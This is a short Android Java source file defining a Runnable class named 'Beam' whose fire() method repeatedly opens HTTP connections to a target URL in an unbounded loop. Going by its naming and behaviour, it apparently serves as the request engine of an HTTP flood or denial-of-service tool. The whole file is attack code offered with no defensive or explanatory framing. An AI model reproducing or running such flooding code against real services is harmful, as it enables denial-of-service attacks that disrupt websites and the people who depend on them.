package se.gyran.aio;

import java.io.BufferedInputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import org.apache.http.util.ByteArrayBuffer;

import android.util.Log;

public class Beam implements Runnable {
	private String target;
	private Integer count;
	private Boolean fireing = false;
	
	public Beam(String target)
	{
		this.target = target;
	}
	
	public void fire()
	{
		try {
			this.fireing = true;
			
			while(this.fireing)
			{
				URL url = new URL(this.target);
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				//conn.setRequestProperty("User-agent", );
				
				InputStream in = new BufferedInputStream(conn.getInputStream());
				
				while(in.available() > 0)
					in.read();
			}
			
		} catch (Exception e) { 
			Log.v("BEAM", "Fireing failed..");
			e.printStackTrace();
			
		}
		finally {
			this.fireing = false;
		}
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		this.fire();
	}

}
